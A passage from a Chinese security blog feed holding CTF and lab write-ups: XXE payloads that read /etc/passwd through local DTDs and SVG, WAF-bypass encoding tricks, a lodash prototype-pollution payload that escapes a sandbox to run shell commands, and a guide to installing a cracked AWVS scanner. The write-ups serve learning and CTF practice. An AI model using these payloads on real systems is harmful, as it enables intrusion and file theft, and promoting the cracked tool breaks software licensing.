<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY % para &#39;&lt;!ENTITY &amp;#x25; files SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&#39;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>这里的<code>%</code>转义之后即为符号串<code>&amp;#x25</code></p>
<h2 id="内部（本地）DTD调用"><a href="#内部（本地）DTD调用" class="headerlink" title="内部（本地）DTD调用"></a>内部（本地）DTD调用</h2><p>当防火墙不允许引用外部DTD时，我们可以引用本地dtd文件</p>
<h1 id="以下是一些常见的本地DTD文件位置"><a href="#以下是一些常见的本地DTD文件位置" class="headerlink" title="以下是一些常见的本地DTD文件位置"></a>以下是一些常见的本地DTD文件位置</h1><h2 id="Custom-Linux-System"><a href="#Custom-Linux-System" class="headerlink" title="Custom Linux System"></a>Custom Linux System</h2><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamsa</span> <span class="meta-string">&#x27;Your DTD code&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%local_dtd;</span></span><br></pre></td></tr></table></figure>
<h2 id="Custom-Windows-System"><a href="#Custom-Windows-System" class="headerlink" title="Custom Windows System"></a>Custom Windows System</h2><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">SuperClass</span> <span class="meta-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%local_dtd;</span></span><br></pre></td></tr></table></figure>
<h2 id="Cisco-WebEx"><a href="#Cisco-WebEx" class="headerlink" title="Cisco WebEx"></a>Cisco WebEx</h2><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">url</span>.attribute.set <span class="meta-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%local_dtd;</span></span><br></pre></td></tr></table></figure>
<h2 id="Citrix-XenMobile-Server"><a href="#Citrix-XenMobile-Server" class="headerlink" title="Citrix XenMobile Server"></a>Citrix XenMobile Server</h2><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">Body</span> <span class="meta-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%local_dtd;</span></span><br></pre></td></tr></table></figure>
<h2 id="Custom-Multi-Platform-IBM-WebSphere-Application"><a href="#Custom-Multi-Platform-IBM-WebSphere-Application" class="headerlink" title="Custom Multi-Platform IBM WebSphere Application"></a>Custom Multi-Platform IBM WebSphere Application</h2><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xs-datatypes</span> <span class="meta-string">&#x27;Your DTD code&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">simpleType</span> <span class="meta-string">&quot;a&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">restriction</span> <span class="meta-string">&quot;b&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">boolean</span> <span class="meta-string">&quot;(c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">URIref</span> <span class="meta-string">&quot;CDATA&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">XPathExpr</span> <span class="meta-string">&quot;CDATA&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">QName</span> <span class="meta-string">&quot;NMTOKEN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">NCName</span> <span class="meta-string">&quot;NMTOKEN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">nonNegativeInteger</span> <span class="meta-string">&quot;NMTOKEN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="perl">%local_dtd;</span></span><br></pre></td></tr></table></figure>


<hr>
<p>如何使用内部DTD</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">condition</span> <span class="meta-string">&#x27;aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file &amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>






<h1 id="Jarvis-OJ）api调用"><a href="#Jarvis-OJ）api调用" class="headerlink" title="(Jarvis OJ）api调用"></a>(Jarvis OJ）api调用</h1><p> <a href=" <http://web.jarvisoj.com:9882/>" target="_blank">题目链接</a></p>
<p>go,抓包</p>
<p>可以发现这里应用的content-Type是json</p>
<blockquote>
<p>JSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。其诞生原因是因为XML整合到HTML中各个浏览器实现的细节不尽相同</p>
<p>JSON有2种结构形式，键值对形式和数组形式（如箭头二所示）</p>
</blockquote>
<p>又因为题目hint:请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
<p>判断为XXE漏洞</p>
<p>将json修改为xml,并构造外部引用</p>
<img src="http://img.npfs06.top/20210730191317.png" style="zoom:80%;">

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">NPFS</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/etc/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">somrthing</span>&gt;</span><span class="symbol">&amp;npfs;</span><span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><p><strong>方法1：文档中的额外空格</strong></p>
<p>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入额外的空格，从而绕过此类WAF。</p>
<p><img src="https://img.npfs06.top/20210306103136.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>方法2：格式无效</strong></p>
<p>为了绕过WAF，攻击者可能会发送特殊格式的XML文档，以便WAF认为它们无效。</p>
<p>链接到未知实体</p>
<p>比较成熟的WAF设置通常不会读取链接文件的内容。这种策略通常是有意义的，否则，WAF本身也可能成为攻击的目标。问题是，外部资源的链接不仅可以存在于文档的第三部分（正文），还可以存在于声明&lt;! DOCTYPE&gt;中 。<br>这意味着未读取文件内容的WAF将不会读取文档中实体的声明。而指向未知实体的链接又会阻止XML解析器导致错误。</p>
<p><img src="http://img.npfs06.top/20210306103204.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br>幸运的是，防止这样的绕过非常简单——命令WAF中的XML解析器在遇到未知实体后不要关闭。</p>
<p><strong>方法三:外来编码（Exotic encodings</strong></p>
<p>除了前面提到的xml文档的三个部分之外，还有位于它们之上的第四个部分，它们控制文档的编码（例如<?xml?>）——文档的第一个字节带有可选的BOM(字节顺序标记)。<br>更多信息：<a href="https://www.w3.org/TR/xml/#sec-guessing">https://www.w3.org/TR/xml/#sec-guessing</a><br>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。<br>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。<br>外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。</p>
<p><strong>方法4：在一个文档中使用两种类型的编码</strong></p>
<p>在上一节中，我们演示了文档的编码通常由其第一个字节指定。但是当包含编码属性的<?xml?>标记引用文档开头的不同字符集时会发生什么？在这种情况下，一些解析器更改编码，使文件的开头有一组字符，其余的是另一组编码。。也就是说，不同的解析器可能在不同的时间转换编码。Java解析器(javax.xml.parsers)在<?xml?>结束后严格地更改字符集，而libxml2解析器可以在执行“编码”属性的值之后或在处理<?xml?>之前或之后切换编码。<br>只有在根本不处理这些文件时，比较成熟的WAF才能可靠地防止这些文件中的攻击。我们还必须记住，有许多同义词编码，例如UTF-32BE和UCS-4BE。此外，有些编码可能不同，但从编码文档初始部分 <code>&lt;?xml?&gt;</code>的角度来看，它们是兼容的。例如，看似UTF-8的文档可能包含字符串<code>&lt;?xml version=”1.0” encoding=”windows-1251”?&gt;</code>。</p>
<p>参考：</p>
<p><a href="https://xz.aliyun.com/t/3357#toc-22">https://xz.aliyun.com/t/3357#toc-22</a><br><a href="https://p0rz9.github.io/2019/02/27/xxe/#">https://p0rz9.github.io/2019/02/27/xxe/#</a><br><a href="https://security.tencent.com/index.php/blog/msg/69">https://security.tencent.com/index.php/blog/msg/69</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>awvs14破解版docker一键安装</title>
    <url>/2021/08/16/awvs14%E7%A0%B4%E8%A7%A3%E7%89%88docker%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>前段时间云服务器过期，很多东西都要迁移，刚好这几天漏洞盒子在冲月榜，重新搭了下awvs，结果发现死活访问不了网站，这里做个记录 <a id="more"></a></p>
<h1 id="1-使用docker查看是否有awvs；"><a href="#1-使用docker查看是否有awvs；" class="headerlink" title="1.使用docker查看是否有awvs；"></a>1.使用docker查看是否有awvs；</h1><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">root</span>@<span class="number">111</span>:~# docker search awvs</span><br><span class="line"><span class="attribute">NAME</span>                       DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line"><span class="attribute">secfa</span>/docker-awvs          AWVS<span class="number">14</span> <span class="number">210503151</span>  Linux Version Crack By Fah…   <span class="number">52</span>                   </span><br><span class="line"><span class="attribute">leishianquan</span>/awvs-nessus                                                   <span class="number">21</span>                   </span><br><span class="line"><span class="attribute">xrsec</span>/awvs                 Awvs <span class="number">14</span> Scanner、fahai                           <span class="number">4</span>                    </span><br><span class="line"><span class="attribute">tiancizzz</span>/awvs             一款知名的网络漏洞扫描工具                                   <span class="number">1</span>                    </span><br><span class="line"><span class="attribute">lazj</span>/awvs<span class="number">13</span>                                                                <span class="number">1</span>                    </span><br><span class="line"><span class="attribute">k3rwin</span>/awvs<span class="number">13</span>                                                              <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">hangezhao</span>/awvs                                                             <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">xxlm</span>/awvs<span class="number">13</span>cn                                                              <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">zeyanlin</span>/awvs                                                              <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">xfantasy</span>/awvs                                                              <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">smarttang</span>/awvs_<span class="number">2019</span>_<span class="number">07</span>                                                     <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">110110</span>/awvs<span class="number">13</span>                                                              <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">jstang</span>/awvs                配置了API密钥的容器镜像                                   <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">meterpreter</span>/awvs                                                           <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">littlehoury</span>/awvs           A wonderful virtual sleep                       <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">evil0x0</span>/awvs                                                               <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">saline</span>/awvsengine                                                          <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">sigle0724</span>/awvs                                                             <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">yimingy72</span>/awvs<span class="number">14</span>                                                           <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">nienie</span>/awvs<span class="number">13</span>                                                              <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">cure0jvs</span>/awvs-engine                                                       <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">xschur666</span>/awvs                                                             <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">ganl</span>/awvs                                                                  <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">yakoazz</span>/awvsnessus                                                         <span class="number">0</span>                    </span><br><span class="line"><span class="attribute">srsecmmm</span>/awvs<span class="number">13</span>            分布式部署                                           <span class="number">0</span>                                        </span><br></pre></td></tr></table></figure>
<h1 id="2-这里我们下载第一个下载次数最多的；"><a href="#2-这里我们下载第一个下载次数最多的；" class="headerlink" title="2.这里我们下载第一个下载次数最多的；"></a>2.这里我们下载第一个下载次数最多的；</h1><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[root@<span class="number">111</span>]# docker pull secfa/docker-awvs</span><br><span class="line">Using default <span class="keyword">ta</span><span class="variable">g:</span> latest</span><br><span class="line">lates<span class="variable">t:</span> Pulling from secfa/docker-awvs</span><br><span class="line">da7391352a9<span class="variable">b:</span> Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">14428</span>a6d4bcd: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">2</span>c2d948710f2: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">92</span>d53db52715: Pull <span class="built_in">complete</span> </span><br><span class="line">dddab6abad69: Pull <span class="built_in">complete</span> </span><br><span class="line">Diges<span class="variable">t:</span> <span class="built_in">sha256</span>:f10492ebd89a900ac0bba810690b621a839fefc1026bfc3a99ae54ac423742a0</span><br><span class="line">Statu<span class="variable">s:</span> Downloaded newer image <span class="keyword">for</span> secfa/docker-awv<span class="variable">s:latest</span></span><br></pre></td></tr></table></figure>
<h1 id="3-查看安装的镜像"><a href="#3-查看安装的镜像" class="headerlink" title="3.查看安装的镜像"></a>3.查看安装的镜像</h1><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">[root@<span class="number">111</span>]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY                       <span class="keyword">TAG</span>                 <span class="title">IMAGE</span> ID            CREATED             SIZE</span><br><span class="line">secfa/docker-awvs                latest              <span class="number">5</span>c1a22cc10bd        <span class="number">2</span> months ago        <span class="number">1.04</span>GB</span><br><span class="line">pxc                              latest              ad45cffb713a        <span class="number">8</span> months ago        <span class="number">491M</span>B</span><br><span class="line">percona/percona-xtradb-cluster   <span class="number">5.7</span>                 ad45cffb713a        <span class="number">8</span> months ago        <span class="number">491M</span>B</span><br></pre></td></tr></table></figure>
<h1 id="4-启动停止"><a href="#4-启动停止" class="headerlink" title="4.启动停止"></a>4.启动停止</h1><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 起别名的方式启动</span></span><br><span class="line">docker <span class="built_in">run</span> -d -p <span class="number">3443</span>:<span class="number">3443</span> --name my-awvs secfa/docker-awvs</span><br><span class="line">以后停止启动的时候使用别名启动停止：</span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># docker stop my-awvs</span></span><br><span class="line"> </span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># docker start my-awvs</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">docker <span class="built_in">run</span> -d -p <span class="number">3443</span>:<span class="number">3443</span> secfa/docker-awvs</span><br><span class="line"> </span><br><span class="line">[root<span class="symbol">@hadoop</span><span class="number">-03</span> ~]<span class="meta"># docker stop 5c5eca394479</span></span><br><span class="line"><span class="number">5</span>c5eca394479</span><br><span class="line">[root<span class="symbol">@hadoop</span><span class="number">-03</span> ~]<span class="meta"># docker ps</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">[root<span class="symbol">@hadoop</span><span class="number">-03</span> ~]<span class="meta"># docker run -d -p 3443:3443 secfa/docker-awvs</span></span><br><span class="line"><span class="number">9</span>edae21cf46fae05833ce2c16557378cc2c7b8b5e41ee8e9db35566c16c2d2c5</span><br></pre></td></tr></table></figure>
<h1 id="5-访问"><a href="#5-访问" class="headerlink" title="5.访问"></a>5.访问</h1><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 使用https  （这里我就是因为用的http协议访问网站所以死活访问不了）</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//xxx.xxx.xxx.xxx:3443/</span></span><br><span class="line"><span class="symbol">username:</span> admin@admin.com</span><br><span class="line"><span class="symbol">password:</span> Admin123</span><br></pre></td></tr></table></figure>
<h1 id="6-修改awvs管理员信息"><a href="#6-修改awvs管理员信息" class="headerlink" title="6.修改awvs管理员信息"></a>6.修改awvs管理员信息</h1><p>我们拉取的secfa/docker-awvs是有默认的管理员用户名和密码的，虽然可以登陆进去改密码，但是想要改管理员用户邮箱呢</p>
<p>首先要进入容器</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker ps -a      <span class="regexp">//</span>查看容器，找到相应id</span><br><span class="line">docker exec -it id  <span class="regexp">/bin/</span>bash      <span class="regexp">//</span>进入容器</span><br><span class="line">cd <span class="regexp">/home/</span>acunetix/.acunetix</span><br><span class="line">./change_credentials.sh</span><br></pre></td></tr></table></figure>
<p>输入新的的管理员邮箱和密码<br>如果输错了，后退键删不了，ctrl+u即可（清除终端光标前的命令，对应的是ctrl+k，清除光标后的命令），如下图左边箭头是光标前，右边箭头是光标后</p>
<img src="http://img.npfs06.top/20210816160952.png" style="zoom:80%;">



<p>最后会有这样的报错提示，但是不用管，修改其实是已经生效了的，也不用重启该容器，直接登陆</p>
<img src="http://img.npfs06.top/20210816161004.png" style="zoom:80%;">]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>code breaking thejs</title>
    <url>/2020/12/30/code-breaking-thejs/</url>
    <content><![CDATA[<p>复现了下P神小密圈Code breaking 挑战赛的js题<code>hard - thejs</code> <a id="more"></a></p>
<p>源码：<a href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs">https://github.com/phith0n/code-breaking/tree/master/2018/thejs</a></p>
<p>如果想要修改父对象的原型，有如下两种方式</p>
<ol>
<li><code>inst.constructor.prototype</code></li>
<li><code>inst.__proto__</code><br>那么推广一下的话，又有如下两种方式</li>
<li><code>inst[constructor][prototype][]</code></li>
<li><code>inst[__proto__][]</code><br>所以也就是说只要找对数组进行操作的地方，我们就有可能完成对原型的污染。但是还要注意的是想办法赋值的<code>__proto__</code>对象并不是真正的这个对象，所以想要写到真正的<code>__proto__</code>中，我们需要一层赋值。</li>
</ol>
<hr>
<p>初始页面</p>
<p><img src="https://img.npfs06.top/20210405154241.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>审计代码,关键点如下</p>
<p><img src="https://img.npfs06.top/20210405160347.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞，会直接将注入原型的属性的值写去最底层的object。我们需要找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p>
<p>发现页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中</p>
<p><img src="https://img.npfs06.top/20210405160750.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>恰好发现vscode提示sourceURLs,那就跟踪到这个函数看一下</p>
<p><a href="https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js">https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js</a></p>
<p><img src="https://img.npfs06.top/20210405161121.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>可以看到options是一个对象，sourceURL是通过赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</p>
<p>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p>
<p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</p>
<p><img src="http://img.npfs06.top/20210405161520.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>通过构造chile_process.exec()就可以执行任意代码了。</p>
<p>我们可以这么利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="function"><span class="keyword">Function</span>(<span class="params"><span class="string">&quot;&quot;</span>,<span class="string">&quot;//# sourceURL=&#x27;xxx&#x27;\r\n CODE \r\n&quot;</span></span>)(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure>
<p>本来构造的是</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">global</span><span class="selector-class">.require</span>(<span class="string">&quot;child_process&quot;</span>)<span class="selector-class">.execSync</span>(<span class="string">&quot;whoami&quot;</span>)<span class="selector-class">.toString</span>()</span><br></pre></td></tr></table></figure>
<p>但是此题环境中有沙箱对此进行了限制，因此如下payload是无法成功的。需要对沙箱环境进行bypass</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span> : &#123;&quot;<span class="type">sourceURL</span><span class="string">&quot; : &quot;</span>\r\nreturn e = () =&gt; &#123;<span class="keyword">for</span> (var a <span class="keyword">in</span> &#123;&#125;)&#123;delete Object.prototype[a];&#125;<span class="keyword">return</span> global.require(<span class="symbol">&#x27;child_process</span>&#x27;).execSync(<span class="symbol">&#x27;whoami</span>&#x27;).to</span><br></pre></td></tr></table></figure>
<p>最终paylaod如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span> : &#123;<span class="attr">&quot;sourceURL&quot;</span> : <span class="string">&quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()&#125;\r\n&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>注意下content-type要改成application/json</p>
<p><img src="http://img.npfs06.top/20210405165225.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>ctfhub信息泄露</title>
    <url>/2020/04/23/ctfhub%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<p>可用扫描工具尝试扫描（disearch、御剑等)<a id="more"></a></p>
<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><p><strong>Method One</strong></p>
<p>直接手动遍历</p>
<p><strong>Method Two</strong></p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">import</span> <span class="variable">requests</span></span><br><span class="line"><span class="variable">url</span> = <span class="string">&quot;url&quot;</span></span><br><span class="line"><span class="variable">for</span> <span class="variable">i</span> <span class="variable"><span class="keyword">in</span></span> <span class="function"><span class="title">range</span>(<span class="number">5</span>):</span></span><br><span class="line"><span class="function">    <span class="variable">for</span> <span class="variable">j</span> <span class="variable"><span class="keyword">in</span></span> <span class="title">range</span>(<span class="number">5</span>):</span></span><br><span class="line"><span class="function">        <span class="variable">a</span> =<span class="variable">url</span>+<span class="string">&quot;/&quot;</span>+<span class="title">str</span>(<span class="variable">i</span>)+<span class="string">&quot;/&quot;</span>+<span class="title">str</span>(<span class="variable">j</span>)</span></span><br><span class="line">        <span class="variable">r</span> = <span class="variable">requests.get</span>(<span class="variable">a</span>)</span><br><span class="line">        <span class="variable">r.encoding</span> = 